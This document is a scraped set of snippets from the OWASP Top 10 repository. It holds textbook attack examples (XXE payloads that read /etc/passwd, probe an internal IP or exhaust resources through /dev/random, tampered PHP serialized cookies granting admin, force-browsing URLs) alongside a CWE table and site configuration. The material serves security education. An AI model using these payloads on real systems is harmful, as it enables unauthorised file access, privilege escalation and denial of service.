----------------------------------------

TITLE: Force Browsing to Unauthorized Web Pages
DESCRIPTION: These HTTP URLs demonstrate a force browsing vulnerability where an attacker attempts to access pages directly by guessing or knowing their paths. If an unauthenticated user can access authenticated pages, or a non-admin user can access admin-only pages, it indicates a broken access control flaw. This highlights the importance of robust server-side authorization checks on every request.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa5-broken-access-control.md#_snippet_2

LANGUAGE: HTTP
CODE:
```
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: Detecting Force Browsing to Restricted Application Pages
DESCRIPTION: This scenario illustrates how an attacker can attempt to bypass access controls by directly navigating to application URLs that should require specific authentication or authorization (e.g., admin pages). If an unauthenticated user can access a protected page, or a standard user can access an admin page, it indicates a critical access control flaw.
SOURCE: https://github.com/owasp/top10/blob/master/2021/docs/A01_2021-Broken_Access_Control.ja.md#_snippet_1

LANGUAGE: URL
CODE:
```
https://example.com/app/getappInfo
https://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: Force Browsing to Privileged URLs
DESCRIPTION: This scenario illustrates how attackers can attempt to access restricted or administrative pages by simply modifying URLs. If an unauthenticated user can access authenticated pages, or a non-admin user can access admin pages, it indicates a broken access control vulnerability.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa5-broken-access-control.md#_snippet_1

LANGUAGE: HTTP
CODE:
```
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

----------------------------------------

TITLE: PHP Object Serialization Tampering Example
DESCRIPTION: This example demonstrates how an attacker can modify a serialized PHP object, specifically a 'super' cookie, to elevate their privileges from a regular user to an administrator. The first string shows the original serialized user state, and the second string shows the modified state with 'admin' privileges.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_9

LANGUAGE: PHP
CODE:
```
Original User State:
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

Attacker Modified Admin State:
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

----------------------------------------

TITLE: XXE Attack: Probing Internal Network
DESCRIPTION: This XML snippet shows how an attacker can use an XXE vulnerability to probe the server's internal network. By changing the external entity's SYSTEM URI, the attacker attempts to access internal resources like a private web server.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa4-xxe.md#_snippet_1

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
<foo>&xxe;</foo>
```

----------------------------------------

TITLE: XXE Attack: Probe Private Network
DESCRIPTION: This snippet demonstrates an XML External Entity (XXE) attack where an attacker attempts to probe a server's internal network by referencing a private IP address. This can reveal internal network topology or services.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-fr.html#_snippet_1

LANGUAGE: XML
CODE:
```
<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
```

----------------------------------------

TITLE: XXE Attack: Private Network Probing
DESCRIPTION: This XML External Entity (XXE) snippet demonstrates how an attacker can attempt to probe a server's private network by referencing an internal IP address. If the XML parser processes external entities, it might attempt to connect to the specified internal resource, potentially revealing network topology or accessible services.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_4

LANGUAGE: XML
CODE:
```
<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
```

----------------------------------------

TITLE: PHP Object Serialization Example and Attack
DESCRIPTION: Illustrates how PHP object serialization is used to store user state in a cookie and how an attacker can modify the serialized string to escalate privileges. The first code block shows a legitimate serialized user state, and the second shows a tampered version granting admin privileges.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa8-insecure-deserialization.md#_snippet_0

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

----------------------------------------

TITLE: Demonstrate PHP Insecure Deserialization Attack
DESCRIPTION: This snippet illustrates how a PHP serialized object, used for storing user state in a cookie, can be tampered with by an attacker. The first string shows a legitimate user's serialized cookie, while the second demonstrates how an attacker can modify it to gain administrative privileges by changing the user ID and role.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-pt-br.html#_snippet_6

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

----------------------------------------

TITLE: XXE Attack: Denial of Service (DoS) via Endless File
DESCRIPTION: This XML External Entity (XXE) snippet illustrates a denial-of-service (DoS) attack. By referencing a potentially endless file (like /dev/random on Unix-like systems), an attacker can cause the XML parser to consume excessive resources, leading to system instability or unresponsiveness. This exploits the parser's attempt to read the entire referenced external entity.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-en.html#_snippet_5

LANGUAGE: XML
CODE:
```
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
```

----------------------------------------

TITLE: XXE Attack: Denial of Service (Resource Exhaustion)
DESCRIPTION: This XML snippet illustrates an XXE-based denial-of-service attack. By directing the external entity to a potentially endless or resource-intensive file (like /dev/random on Unix-like systems), the attacker can cause the XML parser to consume excessive system resources, leading to a denial of service.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa4-xxe.md#_snippet_2

LANGUAGE: XML
CODE:
```
 <!ENTITY xxe SYSTEM "file:///dev/random" >]>
```

----------------------------------------

TITLE: XXE Attack: Denial-of-Service (DoS)
DESCRIPTION: This XML entity definition shows an XXE attack aimed at causing a denial-of-service by referencing a potentially endless or slow-reading file like `/dev/random`, which can consume server resources and lead to application unresponsiveness.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa4-xxe.md#_snippet_2

LANGUAGE: XML
CODE:
```
 <!ENTITY xxe SYSTEM "file:///dev/random" >]>
```

----------------------------------------

TITLE: XXE Attack: Denial-of-Service with Endless File
DESCRIPTION: This snippet illustrates an XML External Entity (XXE) attack designed to cause a denial-of-service by referencing a system resource that can provide an endless stream of data, such as /dev/random on Unix-like systems. This can exhaust server resources.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-fr.html#_snippet_2

LANGUAGE: XML
CODE:
```
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
```

----------------------------------------

TITLE: Extracting data from server using XXE
DESCRIPTION: This XML snippet demonstrates an XXE attack where an external entity is used to read the content of the '/etc/passwd' file from the server's filesystem. This is a common method for attackers to extract sensitive information.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-fr.html#_snippet_0

LANGUAGE: xml
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

----------------------------------------

TITLE: XXE Attack: Denial of Service (Resource Consumption)
DESCRIPTION: This XML snippet illustrates an XXE-based denial-of-service attack. By referencing a potentially endless file like /dev/random, the attacker can cause the XML parser to consume excessive resources, leading to a denial of service.
SOURCE: https://github.com/owasp/top10/blob/master/2017/en/0xa4-xxe.md#_snippet_2

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///dev/random" >]>
<foo>&xxe;</foo>
```

----------------------------------------

TITLE: PHP Object Serialization Example (Normal User State)
DESCRIPTION: This PHP serialized string represents a user's state, typically stored in a 'super' cookie. It includes the user ID (132), username ('Mallory'), role ('user'), and a password hash. This demonstrates how application state can be serialized and passed between client and server.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa8-insecure-deserialization.md#_snippet_0

LANGUAGE: PHP
CODE:
```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

----------------------------------------

TITLE: XML External Entity (XXE) Denial of Service Attack
DESCRIPTION: Demonstrates an XML External Entity (XXE) attack where an attacker attempts a denial-of-service by defining an external entity that points to a potentially endless file, such as /dev/random on Unix-like systems. This can consume system resources and lead to service unavailability.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-pt-br.html#_snippet_2

LANGUAGE: XML
CODE:
```
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
```

----------------------------------------

TITLE: XXE Attack: Probing Private Network
DESCRIPTION: This XML snippet shows how an attacker can use an XXE vulnerability to probe the server's internal private network. By changing the external entity's SYSTEM identifier to an internal IP address or URL, the attacker can attempt to discover accessible internal resources or services.
SOURCE: https://github.com/owasp/top10/blob/master/2017/ro/0xa4-xxe.md#_snippet_1

LANGUAGE: XML
CODE:
```
 <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
```

----------------------------------------

TITLE: XXE Attack: Probing Private Network
DESCRIPTION: This XML entity definition illustrates how an attacker can use an XXE vulnerability to probe internal or private networks by attempting to access a specific internal IP address and path, revealing network topology or accessible services.
SOURCE: https://github.com/owasp/top10/blob/master/2017/he/0xa4-xxe.md#_snippet_1

LANGUAGE: XML
CODE:
```
 <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
```

----------------------------------------

TITLE: XXE Attack: Probing Internal Network
DESCRIPTION: This XML snippet illustrates an XXE attack used to probe internal network systems. By changing the external entity's SYSTEM identifier to an internal IP address or URL (e.g., https://192.168.1.1/private), an attacker can attempt to make the server send requests to internal resources, potentially mapping the internal network or accessing restricted services.
SOURCE: https://github.com/owasp/top10/blob/master/2017/OWASP-Top-10-2017-pt-br.html#_snippet_1

LANGUAGE: XML
CODE:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
  <foo>&xxe;</foo>
```

----------------------------------------

TITLE: Common Weakness Enumeration (CWE) ID to Name Mapping
DESCRIPTION: This table lists various Common Weakness Enumeration (CWE) IDs along with their corresponding names, providing a quick reference for identifying and categorizing vulnerabilities relevant to the OWASP Top 10 project. It includes common security weaknesses such as injection flaws, access control issues, and cryptographic weaknesses.
SOURCE: https://github.com/owasp/top10/blob/master/2021/Data/CWE-Guidance.md#_snippet_0

LANGUAGE: APIDOC
CODE:
```
CWE ID	| CWE Name
------------ | -------------
20	| Improper Input Validation
22	| Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
77	| Improper Neutralization of Special Elements used in a Command ('Command Injection')
78	| Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
79	| Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
88	| Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')
89	| Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
90	| Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')
91	| XML Injection (aka Blind XPath Injection)
94	| Improper Control of Generation of Code ('Code Injection')
119	| Improper Restriction of Operations within the Bounds of a Memory Buffer
125	| Out-of-bounds Read
190	| Integer Overflow or Wraparound
200	| Exposure of Sensitive Information to an Unauthorized Actor
209	| Generation of Error Message Containing Sensitive Information
220	| Storage of File With Sensitive Data Under FTP Root
223	| Omission of Security-relevant Information
256	| Unprotected Storage of Credentials
269	| Improper Privilege Management
284	| Improper Access Control
285	| Improper Authorization
287	| Improper Authentication
295	| Improper Certificate Validation
308	| Use of Single-factor Authentication
311	| Missing Encryption of Sensitive Data
312	| Cleartext Storage of Sensitive Information
319	| Cleartext Transmission of Sensitive Information
325	| Missing Required Cryptographic Step
326	| Inadequate Encryption Strength
327	| Use of a Broken or Risky Cryptographic Algorithm
328	| Reversible One-Way Hash
346	| Origin Validation Error
352	| Cross-Site Request Forgery (CSRF)
359	| Exposure of Private Personal Information to an Unauthorized Actor
384	| Session Fixation
400	| Uncontrolled Resource Consumption
416	| Use After Free
425	| Direct Request ('Forced Browsing')
426	| Untrusted Search Path
434	| Unrestricted Upload of File with Dangerous Type
476	| NULL Pointer Dereference
502	| Deserialization of Untrusted Data
521	| Weak Password Requirements
522	| Insufficiently Protected Credentials
523	| Unprotected Transport of Credentials
548	| Exposure of Information Through Directory Listing
564	| SQL Injection: Hibernate
601	| URL Redirection to Untrusted Site ('Open Redirect')
611	| Improper Restriction of XML External Entity Reference
613	| Insufficient Session Expiration
614	| Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
620	| Unverified Password Change
639	| Authorization Bypass Through User-Controlled Key
640	| Weak Password Recovery Mechanism for Forgotten Password
650	| Trusting HTTP Permission Methods on the Server Side
732	| Incorrect Permission Assignment for Critical Resource
772	| Missing Release of Resource after Effective Lifetime
776	| Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')
778	| Insufficient Logging
787	| Out-of-bounds Write
798	| Use of Hard-coded Credentials
917	| Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')
943	| Improper Neutralization of Special Elements in Data Query Logic
1021	| Improper Restriction of Rendered UI Layers or Frames
1216	| Lockout Mechanism Errors
```

----------------------------------------

TITLE: Utility Functions for Local Storage Prefixing and Retrieval
DESCRIPTION: This JavaScript snippet provides two utility functions: `__prefix` and `__get`. The `__prefix` function generates a prefixed key for local storage based on the current URL's pathname. The `__get` function retrieves and parses JSON data from local storage using the generated prefix, with an optional custom storage object.
SOURCE: https://github.com/owasp/top10/blob/master/2021/site/0x00-notice/index.html#_snippet_1

LANGUAGE: JavaScript
CODE:
```
function __prefix(e){return new URL("..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}
```

----------------------------------------

TITLE: OWASP Top 10 Project Configuration Settings
DESCRIPTION: Defines core configuration parameters for the OWASP Top 10 project, including the latest version number, debug logging level, CRE identifier, and localized text strings for 'successor' and 'split to' concepts. These settings control project behavior and internationalization.
SOURCE: https://github.com/owasp/top10/blob/master/osib/README.md#_snippet_8

LANGUAGE: YAML
CODE:
```
#!#      latest:       2                            # 2: add the latest version(s), if successor(s) exist, log an info
#!#      debug:        2                            # debug level (0-4)
#!#      cre:          osib.owasp.cre.1-0
#!#      successor_texts:
#!#        en:         successor
#!#        de:         Nachfolger
#!#      split_to_texts:
#!#        en:         split to
#!#        de:         Aufgeteilt in
```

----------------------------------------

TITLE: MkDocs YAML Extra Variables for OSIB Configuration
DESCRIPTION: Demonstrates how to define OSIB-specific variables within the `extra` section of `mkdocs.yml`. These variables configure the document's OSIB ID, version, default categories, language, and file paths for YAML data export.
SOURCE: https://github.com/owasp/top10/blob/master/osib/README.md#_snippet_7

LANGUAGE: YAML
CODE:
```
extra:
    osib:
     document:     <osib-id>
     version:      <version-no, no dots '.'>
     categories:   [document, awareness]
     default_lang: en
     yaml_file:    include/osib.yml
     export_dir:   export
```

----------------------------------------

TITLE: MkDocs YAML Plugin Configuration for OSIB Macro
DESCRIPTION: Illustrates how to configure the MkDocs `macros` plugin in `mkdocs.yml` to enable the OSIB macros. It specifies the module name and includes optional settings like `include_dir` and `verbose` for debugging.
SOURCE: https://github.com/owasp/top10/blob/master/osib/README.md#_snippet_6

LANGUAGE: YAML
CODE:
```
plugins:
  - macros:
      module_name: 'osib_macro'
      include_dir: include
      verbose: true
```

----------------------------------------

TITLE: Define Root CSS Variables for Fonts
DESCRIPTION: This CSS snippet defines custom properties for font families at the root level of the document. It sets 'Roboto' for general text and 'Roboto Mono' for code, ensuring consistent typography across the site.
SOURCE: https://github.com/owasp/top10/blob/master/2021/site/0x00-notice/index.html#_snippet_0

LANGUAGE: CSS
CODE:
```
:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}
```

----------------------------------------

TITLE: OWASP Top 10 Data Contribution Schema
DESCRIPTION: Defines the required and optional data elements for each dataset contributed to the OWASP Top 10 2025 data analysis effort. Contributors should provide this information per dataset, distinguishing between different types of testing if applicable.
SOURCE: https://github.com/owasp/top10/blob/master/2024/Data/README.md#_snippet_0

LANGUAGE: APIDOC
CODE:
```
DataSet:
  Properties:
    Contributor Name:
      Type: string
      Description: Organization or anonymous identifier of the contributor.
    Contributor Contact Email:
      Type: string
      Description: Email for contact.
    Time period:
      Type: string
      Description: Year(s) of data collection (e.g., 2024, 2023, 2022, 2021).
    Number of applications tested:
      Type: integer
      Required: true
      Description: Total number of applications tested in the dataset.
    CWEs w/ number of applications found in:
      Type: object
      Required: true
      Description: A mapping of CWE IDs to the number of applications where they were found.
    Type of testing:
      Type: string
      Enum: [TaH, HaT, Tools]
      Description: Method of testing used (Tooling assisted Humans, Human assisted Tooling, or Tools only).
    Primary Language (code):
      Type: string
      Description: Primary programming language of the code analyzed.
    Geographic Region:
      Type: string
      Enum: [Global, North America, EU, Asia, other]
      Description: Geographic region where the testing was conducted.
    Primary Industry:
      Type: string
      Enum: [Multiple, Financial, Industrial, Software, ??]
      Description: Primary industry of the applications tested.
    Data contains retests or same applications multiple times:
      Type: boolean
      Description: Indicates if the dataset includes retests or multiple entries for the same applications.
  Notes:
    - If a contributor has two types of datasets (e.g., HaT and TaH), it is recommended to submit them as two separate datasets.
```